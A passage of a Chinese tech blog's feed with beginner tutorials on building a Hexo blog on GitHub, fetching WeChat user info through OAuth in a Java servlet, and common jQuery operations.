    <title>Hexo+GitHub搭建博客(三) 文章的撰写与发布</title>
    <link href="https://coder.lufer.cc/Hexo/Hexo+GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%20%E4%B8%89-%E6%96%87%E7%AB%A0%E7%9A%84%E6%92%B0%E5%86%99%E4%B8%8E%E5%8F%91%E5%B8%83/"/>
    <id>https://coder.lufer.cc/Hexo/Hexo+GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%20%E4%B8%89-%E6%96%87%E7%AB%A0%E7%9A%84%E6%92%B0%E5%86%99%E4%B8%8E%E5%8F%91%E5%B8%83/</id>
    <published>2018-05-17T14:50:36.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E5%BC%80%E5%A7%8B%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87">开始前的准备</a></li><li><a href="#%E5%BB%BA%E7%AB%8B%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0">建立第一篇文章</a></li><li><a href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E4%B8%8EMarkdown%E8%AF%AD%E6%B3%95%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D">文章解析与Markdown语法简要介绍</a></li><li><a href="#%E6%96%87%E7%AB%A0%E5%8F%91%E5%B8%83">文章发布</a></li></ul><h2 id="开始前的准备"><a class="markdownIt-Anchor" href="#开始前的准备"></a> 开始前的准备</h2><p>  文章怎么能没有图呢，所以为了配图，我们要先修改Test文件夹下的_config.yml,把“post_asset_folder“设置为true”，这样就会自动识别图片。</p><p>  可以装个Visual Studio Code，因为它支持Markdown的自动渲染，就可以看见目标页面长啥样啦，就像下图一样。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4xbQ0.png" alt="" /></p><h2 id="建立第一篇文章"><a class="markdownIt-Anchor" href="#建立第一篇文章"></a> 建立第一篇文章</h2><p>  在项目文件夹下，输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new post <span class="string">&quot;First Post&quot;</span></span><br></pre></td></tr></table></figure><p>  或者直接在source\_posts\目录下新建First Post.md和一个名为First Post的文件夹。</p><p>  然后我们编辑这个.md文件就可以啦。</p><h2 id="文章解析与markdown语法简要介绍"><a class="markdownIt-Anchor" href="#文章解析与markdown语法简要介绍"></a> 文章解析与Markdown语法简要介绍</h2><p>  每个通过<code>hexo new post</code>创建的md文件都包含以下文件头，如果是自己创建的md文件，则要把这个头部加进去，所以我建议直接复制以前的md改个名字就好啦，但是记得要改时间哦。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hexo+GitHub搭建博客(三) 文章的撰写与发布</span><br><span class="line">date: 2018-05-17 21:17:36</span><br><span class="line">category: Github</span><br><span class="line">tags: [Github,Hexo]</span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  title是文章标题，在这里写过了之后下面的正文就不要写啦。<br />  date 是写这篇文章的日期，将来hexo是要按照这个排序的。<br />  category 是你希望这篇文章所属的分类目录。<br />  tags 是你给这篇文章添加的标签，如果只有一个标签就直接打就好啦，如果想要多个标签则打成如下形式<code>[标签1,标签2,标签3]</code>。</p><p>  然后就可以写正文啦！</p><h3 id="标题"><a class="markdownIt-Anchor" href="#标题"></a> 标题</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br></pre></td></tr></table></figure><p>  Markdown用#来控制标题，如果需要一级标题，就打一个#然后打一个空格，然后打上标题就可以了,像下面这样。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br></pre></td></tr></table></figure><p>  二级标题就打两个#，三级就打三个。</p><blockquote><p>如果想打出来这种效果呢，就在这行最前面打一个&gt;就可以了</p></blockquote><h3 id="换行"><a class="markdownIt-Anchor" href="#换行"></a> 换行</h3><p>  有三种方式：</p><ol><li>打两个空格</li><li>在需要换行的地方打一个&lt;br&gt;</li><li>打两个回车，但是这样中间会空一个小行</li></ol><h3 id="插入图片"><a class="markdownIt-Anchor" href="#插入图片"></a> 插入图片</h3><p>  把图片放到同名的文件夹里，在需要插入的地方输入<code>&#123;% asset_img imagename.png %&#125;</code>。</p><p>  如果需要特殊字体与颜色。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*斜体文本*    _斜体文本_</span><br><span class="line">**粗体文本**    __粗体文本__</span><br><span class="line">***粗斜体文本***    ___粗斜体文本___</span><br><span class="line"></span><br><span class="line">&lt;font color&#x3D;green&gt;INFO&lt;&#x2F;font&gt;  这样就会有一个绿色的INFO</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="添加链接"><a class="markdownIt-Anchor" href="#添加链接"></a> 添加链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用链接方法</span><br><span class="line">文字链接 [链接名称](https:&#x2F;&#x2F;chwshuang.github.io)</span><br><span class="line">网址链接 &lt;https:&#x2F;&#x2F;chwshuang.github.io&gt;</span><br></pre></td></tr></table></figure><h3 id="制作列表"><a class="markdownIt-Anchor" href="#制作列表"></a> 制作列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">普通无序列表</span><br><span class="line"></span><br><span class="line">- 列表文本前使用 [减号+空格]</span><br><span class="line">+ 列表文本前使用 [加号+空格]</span><br><span class="line">* 列表文本前使用 [星号+空格]</span><br><span class="line"></span><br><span class="line">普通有序列表</span><br><span class="line"></span><br><span class="line">1. 列表前使用 [数字+空格]</span><br><span class="line">2. 我们会自动帮你添加数字</span><br><span class="line">7. 不用担心数字不对，显示的时候我们会自动把这行的 7 纠正为 3</span><br><span class="line"></span><br><span class="line">列表嵌套</span><br><span class="line"></span><br><span class="line">1. 列出所有元素：</span><br><span class="line">    - 无序列表元素 A</span><br><span class="line">        1. 元素 A 的有序子列表</span><br><span class="line">    - 前面加四个空格</span><br><span class="line">2. 列表里的多段换行：</span><br><span class="line">    前面必须加四个空格，</span><br><span class="line">    这样换行，整体的格式不会乱</span><br><span class="line">3. 列表里引用：</span><br><span class="line"></span><br><span class="line">    &gt; 前面空一行</span><br><span class="line">    &gt; 仍然需要在 &gt;  前面加四个空格</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="文章发布"><a class="markdownIt-Anchor" href="#文章发布"></a> 文章发布</h2><p>  文章写完了？发布只需要一行：</p><blockquote><p>CD test<br />hexo d -g</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%BC%80%E5%A7%8B%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87&quot;&gt;开始前的准备&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%BB%BA%E7%AB%8B%E7%AC%AC%E4%B8%8</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+GitHub搭建博客(二)  主题配置</title>
    <link href="https://coder.lufer.cc/Hexo/Hexo+GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E4%BA%8C-%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"/>
    <id>https://coder.lufer.cc/Hexo/Hexo+GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E4%BA%8C-%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/</id>
    <published>2018-05-17T13:17:36.000Z</published>
    <updated>2021-04-20T08:32:44.231Z</updated>
    
    <content type="html"><![CDATA[<p>  以yilia为例。</p><p>  有了自己的网站，怎么能不进行一下个性化呢。</p><blockquote><p>目录</p></blockquote><ul><li><a href="#%E4%B8%BB%E9%A2%98%E5%AE%89%E8%A3%85">主题安装</a></li><li><a href="#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">主题配置</a></li></ul><h2 id="主题安装"><a class="markdownIt-Anchor" href="#主题安装"></a> 主题安装</h2><p>  Yilia主题的Github地址为<code>https://github.com/litten/hexo-theme-yilia</code></p><p>  安装主题：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd Test</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;litten&#x2F;hexo-theme-yilia.git themes&#x2F;yilia</span><br></pre></td></tr></table></figure><p>  启用主题：</p><p>  在Test文件夹下的_config.yml中， 把&quot;theme: landscape&quot; 改为&quot;theme: yilia&quot;。</p><p>  这时我们清空一下项目的缓存，重新编译一下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo clear </span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>  这时我们再<code>hexo s</code>就可以看到启用了新主题的网站啦。</p><h2 id="主题配置"><a class="markdownIt-Anchor" href="#主题配置"></a> 主题配置</h2><p>  主题的配置主要修改themes\yilia下的_config.yml，具体修改请参考作者注释。</p><p>  这个主题有一个显示所有文章的侧边栏，这个侧边栏依靠一个新的组件，我们需要进行安装。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd test</span><br><span class="line">npm install hexo-generator-json-content --save</span><br></pre></td></tr></table></figure><p>修改Test目录下的<code>_config.yml</code>最后面添加</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsonContent:</span><br><span class="line">    meta: false</span><br><span class="line">    pages: false</span><br><span class="line">    posts:</span><br><span class="line">      title: true</span><br><span class="line">      date: true</span><br><span class="line">      path: true</span><br><span class="line">      text: false</span><br><span class="line">      raw: false</span><br><span class="line">      content: false</span><br><span class="line">      slug: false</span><br><span class="line">      updated: false</span><br><span class="line">      comments: false</span><br><span class="line">      link: false</span><br><span class="line">      permalink: false</span><br><span class="line">      excerpt: false</span><br><span class="line">      categories: true</span><br><span class="line">      tags: true</span><br></pre></td></tr></table></figure><p>  至此就完成主题的配置。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  以yilia为例。&lt;/p&gt;
&lt;p&gt;  有了自己的网站，怎么能不进行一下个性化呢。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%BB%E9%A2%98%E5%AE%89%E8%A3%</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+GitHub搭建博客(一)  环境配置</title>
    <link href="https://coder.lufer.cc/Hexo/Hexo+GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E4%B8%80-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://coder.lufer.cc/Hexo/Hexo+GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E4%B8%80-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2018-05-17T12:16:36.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>目录</p></blockquote><ul><li><a href="#%E8%83%8C%E6%99%AF%E8%AF%B4%E6%98%8E">背景说明</a></li><li><a href="#git%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE">Git安装与配置</a></li><li><a href="#%E5%88%9B%E5%BB%BA%E7%BD%91%E7%AB%99%E9%A1%B9%E7%9B%AE">创建网站项目</a></li><li><a href="#%E5%AE%89%E8%A3%85hexo">安装Hexo</a></li></ul><h2 id="背景说明"><a class="markdownIt-Anchor" href="#背景说明"></a> 背景说明</h2><p>  首先要理解Hexo与Github，Hexo是一个博客框架，可以把Markdown文法的md文件编译成HTMl页面，随后传到Github上进行展示。</p><p>  Hexo作为npm的一个组件，是由npm进行管理的，而npm是Node.js的一个包管理器。</p><p>  Github由Git进行管理。</p><p>  顾要安装的环境有Git，Node.js，Hexo。</p><p>  文本编辑器推荐Visual Studio Code。</p><h2 id="git安装与配置"><a class="markdownIt-Anchor" href="#git安装与配置"></a> Git安装与配置</h2><p>  Git官网为 <code>https://git-scm.com/</code>。</p><p>  打开Git Bash，在开始菜单输入Git Bash即可搜索到，或者到安装目录\bin\下可以找到Git Bash.exe。</p><p>  输入以下代码生成SSH Key，注意把邮箱替换为刚刚注册Github时所填邮箱,要保留引号。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your.email@example.com&quot;</span> -b 4096</span><br></pre></td></tr></table></figure><p>  会询问保存位置与密码，连输三次回车全部默认。</p><p>  打开C:\User\你的用户名\.ssh\id_rsa.pub文件，复制全部内容。</p><p>  打开Github，登录，点击右上角头像旁的小三角-&gt;Settings。</p><p>  左侧选择SSH and GPG keys，右侧点击New SSH key，Title随便输入，Key部分粘贴刚才文件中的全部内容，点击Add SSH key完成添加，至此完成了Github的全部配置。</p><h2 id="创建网站项目"><a class="markdownIt-Anchor" href="#创建网站项目"></a> 创建网站项目</h2><p>  打开Github,点击右侧<code>New Repository</code>。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zAeO.png" alt="" /></p><p>  Repository内部填入与前面Owner部分一样的名字+“<a href="http://github.io">github.io</a>”,下面选择Public，如下图所示，即完成网站创建。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4zCS1.png" alt="" /></p><h2 id="安装hexo"><a class="markdownIt-Anchor" href="#安装hexo"></a> 安装Hexo</h2><p>  安装Node.js，官网为：</p><p>  <code>https://nodejs.org/en/</code></p><p>  下载LTS版本并安装。</p><p>  装好之后,先建立一个文件夹，即作为自己博客项目所在的文件夹，我这里以D:\Test为例。</p><p>  打开CMD，输入D:切换到D盘，输入cd test进入Test文件夹。</p><p>  输入npm install hexo -g 安装hexo。</p><p>  安装完成之后，输入 hexo init 进行Hexo项目初始化。</p><p>  看到<code>INFO Start blogging with Hexo!</code>说明初始化成功。</p><p>  安装Npm相关组件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>  安装Hexo往Github部署的相关组件。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>  打开_config.yml，进行配置。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line">title: 网站标题</span><br><span class="line">subtitle: 网站副标题</span><br><span class="line">description:  网站描述</span><br><span class="line">keywords:  网站关键字（主要用于搜索引擎搜索）</span><br><span class="line">author:  网站作者</span><br><span class="line">language: zh-CN   #代表使用中文</span><br><span class="line">timezone:  时区，不用填</span><br><span class="line"></span><br><span class="line"><span class="comment">#在最后面修改,&quot;luferl&quot;换成你的Username</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:luferl/luferl.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  至此已经完成了所有配置，运行如下命令来运行Hexo吧。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g <span class="comment">#进行编译</span></span><br><span class="line">hexo s <span class="comment">#启动服务器</span></span><br></pre></td></tr></table></figure><p>  访问localhost:4000即可访问你的Hexo网站。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%83%8C%E6%99%AF%E8%AF%B4%E6%98%8E&quot;&gt;背景说明&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#git%E5%AE%89%E8%A3</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>从零开始的JavaWeb（六）微信获取用户信息</title>
    <link href="https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E5%85%AD%EF%BC%89%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/"/>
    <id>https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E5%85%AD%EF%BC%89%E5%BE%AE%E4%BF%A1%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</id>
    <published>2018-04-28T14:28:53.000Z</published>
    <updated>2021-04-06T02:03:18.961Z</updated>
    
    <content type="html"><![CDATA[<p>  1、构造LoginService类，作为授权的起始页面，引导用户访问该servlet。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//构造回调页面链接，Request.getServerName()来获取当前域名</span></span><br><span class="line">String backUrl=<span class="string">&quot;http://&quot;</span>+request.getServerName()+<span class="string">&quot;/SafeCampus/wechat/CallBack&quot;</span>;</span><br><span class="line">                <span class="comment">//使用公众号的APPID</span></span><br><span class="line">String AppID=<span class="string">&quot;TESTAPPID&quot;</span>;</span><br><span class="line">                <span class="comment">//构造发起请求授权的URL</span></span><br><span class="line">String reurl =<span class="string">&quot;https://open.weixin.qq.com/connect/oauth2/authorize?appid=&quot;</span>+AppID</span><br><span class="line">                \+ <span class="string">&quot;&amp;redirect_uri=&quot;</span>+URLEncoder.encode(backUrl)   <span class="comment">//这里要把回调页面的URL进行Encode</span></span><br><span class="line">                \+ <span class="string">&quot;&amp;response_type=code&quot;</span></span><br><span class="line">                \+ <span class="string">&quot;&amp;scope=snsapi_userinfo&quot;</span></span><br><span class="line">                \+ <span class="string">&quot;&amp;state=STATE#wechat_redirect&quot;</span>;</span><br><span class="line">                <span class="comment">//跳转授权页面，打开授权引导页</span></span><br><span class="line">response.sendRedirect(reurl);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  2、如果用户同意授权，将会跳转至定义的回调页面，并附带参数Code。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String code=request.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line">String access_token = <span class="string">&quot;&quot;</span>; </span><br><span class="line">String line=<span class="string">&quot;&quot;</span>;</span><br><span class="line">String openid = <span class="string">&quot;&quot;</span>;  </span><br><span class="line"><span class="comment">//使用公众号的APPID</span></span><br><span class="line">String AppID=<span class="string">&quot;TESTAPPID&quot;</span>;</span><br><span class="line"><span class="comment">//使用公众号的AppSecret</span></span><br><span class="line">String AppSecret=<span class="string">&quot;TESTAPPSECRET&quot;</span>;</span><br><span class="line"><span class="comment">//构造获取access_token的链接</span></span><br><span class="line">String reurl =<span class="string">&quot;https://api.weixin.qq.com/sns/oauth2/access\_token?appid=&quot;</span>+AppID+<span class="string">&quot;&amp;secret=&quot;</span>+AppSecret+<span class="string">&quot;&amp;code=&quot;</span>+code+<span class="string">&quot;&amp;grant\_type=authorization_code&quot;</span>;</span><br><span class="line"><span class="comment">//创建url连接</span></span><br><span class="line">URL url = <span class="keyword">new</span> URL(reurl);  </span><br><span class="line"><span class="comment">//打开连接 </span></span><br><span class="line">HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection(); </span><br><span class="line">urlConnection.setDoOutput(<span class="keyword">true</span>);  </span><br><span class="line">urlConnection.setDoInput(<span class="keyword">true</span>);  </span><br><span class="line">urlConnection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);  </span><br><span class="line">urlConnection.setUseCaches(<span class="keyword">false</span>);  </span><br><span class="line">urlConnection.connect();  </span><br><span class="line">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream(), <span class="string">&quot;utf-8&quot;</span>));  </span><br><span class="line"><span class="comment">//存储服务器返回的信息</span></span><br><span class="line">StringBuffer buffer = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line"><span class="comment">//读取返回值保存到buffer</span></span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;  </span><br><span class="line">buffer.append(line);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//断开连接</span></span><br><span class="line">urlConnection.disconnect();</span><br><span class="line"><span class="comment">//buffer转string</span></span><br><span class="line">String result = buffer.toString();  </span><br><span class="line"><span class="comment">//String转Obj</span></span><br><span class="line">JSONObject resultObject = JSONObject.fromObject(result);</span><br><span class="line"><span class="comment">//获取用户的openid </span></span><br><span class="line">openid = resultObject.getString(<span class="string">&quot;openid&quot;</span>);</span><br><span class="line"><span class="comment">//获取返回的access_token</span></span><br><span class="line">access\_token=resultObject.getString(<span class="string">&quot;access\_token&quot;</span>);</span><br><span class="line"><span class="comment">//构建获取用户详细信息的链接，使用刚获得的openid和access_token</span></span><br><span class="line">reurl=<span class="string">&quot;https://api.weixin.qq.com/sns/userinfo?access\_token=&quot;</span>+access\_token+<span class="string">&quot;&amp;openid=&quot;</span>+openid+<span class="string">&quot;&amp;lang=zh_CN&quot;</span>;</span><br><span class="line">url = <span class="keyword">new</span> URL(reurl); </span><br><span class="line">urlConnection = (HttpURLConnection) url.openConnection();</span><br><span class="line">urlConnection.setDoOutput(<span class="keyword">true</span>);  </span><br><span class="line">urlConnection.setDoInput(<span class="keyword">true</span>);  </span><br><span class="line">urlConnection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);  </span><br><span class="line">urlConnection.setUseCaches(<span class="keyword">false</span>);  </span><br><span class="line">urlConnection.connect();  </span><br><span class="line">reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream(), <span class="string">&quot;utf-8&quot;</span>));  </span><br><span class="line">buffer = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line">line=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;  </span><br><span class="line">buffer.append(line);  </span><br><span class="line">&#125; </span><br><span class="line">urlConnection.disconnect();</span><br><span class="line">result = buffer.toString();  </span><br><span class="line">resultObject = JSONObject.fromObject(result);</span><br><span class="line"><span class="comment">//获得用户昵称</span></span><br><span class="line">String nickname = resultObject.getString(<span class="string">&quot;nickname&quot;</span>); </span><br><span class="line"><span class="comment">//其它最终返回参数如下</span></span><br><span class="line"><span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;nickname&quot;</span>,</span><br><span class="line"><span class="string">&quot;sex&quot;</span>: <span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;language&quot;</span>: <span class="string">&quot;zh_CN&quot;</span>,</span><br><span class="line"><span class="string">&quot;city&quot;</span>: <span class="string">&quot;city&quot;</span>,</span><br><span class="line"><span class="string">&quot;province&quot;</span>: <span class="string">&quot;province&quot;</span>,</span><br><span class="line"><span class="string">&quot;country&quot;</span>: <span class="string">&quot;中国&quot;</span>,</span><br><span class="line"><span class="string">&quot;headimgurl&quot;</span>: <span class="string">&quot;http://wx.qlogo.cn/mmopen/JcDicrZBlREhnNXZRudod9PmibRkIs5K2f1tUQ7lFjC63pYHaXGxNDgMzjGDEuvzYZbFOqtUXaxSdoZG6iane5ko9H30krIbzGv/0&quot;</span>,</span><br><span class="line"><span class="string">&quot;subscribe_time&quot;</span>: <span class="number">1386160805</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  1、构造LoginService类，作为授权的起始页面，引导用户访问该servlet。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;spa</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>从零开始的JavaWeb（五）JQuery常用操作</title>
    <link href="https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%BA%94%EF%BC%89JQuery%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
    <id>https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%BA%94%EF%BC%89JQuery%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/</id>
    <published>2018-04-28T14:23:35.000Z</published>
    <updated>2021-04-06T02:03:23.993Z</updated>
    
    <content type="html"><![CDATA[<p>  1、动态添加元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> know = document.createElement(<span class="string">&#x27;div&#x27;</span>); <span class="comment">//创建元素</span></span><br><span class="line">know.setAttribute(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;form-group&quot;</span>); <span class="comment">//设置class样式</span></span><br><span class="line">know.innerHTML=<span class="string">&quot;知识点</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> [删除](#) &quot;</span>;<span class="comment">//设置HTML内容</span></span><br><span class="line"><span class="keyword">var</span> field = document.getElementById(<span class="string">&#x27;knowledge&#x27;</span>); <span class="comment">//2、找到父级元素</span></span><br><span class="line">field.appendChild(know);<span class="comment">//插入</span></span><br></pre></td></tr></table></figure><p>  2、动态删除元素</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除按钮设定class为delete，取所有delete元素绑定click事件</span></span><br><span class="line">$(<span class="string">&#x27;.delete&#x27;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="built_in">this</span>).parent().remove();<span class="comment">//从父级元素开始删除</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>  3、字符串查找及与ASCII转换</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将返回A在字符串answer中的位置，如果没有返回-1</span></span><br><span class="line">answer.indexOf(<span class="string">&quot;A&quot;</span>)</span><br><span class="line"><span class="comment">//返回ASCII码为65的字符</span></span><br><span class="line"><span class="built_in">String</span>.fromCharCode(<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>  4、控制元素的显示与隐藏</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//显示</span></span><br><span class="line">singlesection[<span class="number">0</span>].style.display=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="comment">//隐藏</span></span><br><span class="line">multysection[<span class="number">0</span>].style.display=<span class="string">&quot;none&quot;</span>;</span><br></pre></td></tr></table></figure><p>  5、控制元素的可用于禁用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//禁用</span></span><br><span class="line">$(<span class="string">&#x27;#directurl&#x27;</span>).attr(<span class="string">&quot;disabled&quot;</span>,<span class="string">&quot;disabled&quot;</span>);</span><br><span class="line"><span class="comment">//启用</span></span><br><span class="line">$(<span class="string">&#x27;#directurl&#x27;</span>).removeAttr(<span class="string">&quot;disabled&quot;</span>);</span><br></pre></td></tr></table></figure><p>  6、获取下拉列表选中的值</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&quot;#college option:selected&quot;</span>).val()</span><br></pre></td></tr></table></figure><p>  7、正则表达式获取当前页面的参数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//quizid作为key</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(^|&amp;)quizid=(\[^&amp;\]*)(&amp;|$)&quot;</span>, <span class="string">&quot;i&quot;</span>);  </span><br><span class="line"><span class="keyword">var</span> r = <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>).match(reg);</span><br><span class="line"><span class="comment">//quizid中即为value</span></span><br><span class="line"><span class="keyword">var</span> quizid=r\[<span class="number">2</span>\];</span><br></pre></td></tr></table></figure><p>  8、控制页面跳转</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//刷新当前页面</span></span><br><span class="line">location.reload() </span><br><span class="line"><span class="comment">//重定向到某个页面</span></span><br><span class="line"><span class="built_in">window</span>.location.href=<span class="string">&quot;index.html&quot;</span>;</span><br><span class="line"><span class="comment">//返回到上一页面，并刷新上个页面</span></span><br><span class="line">self.location=<span class="built_in">document</span>.referrer;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  1、动态添加元素&lt;/p&gt;
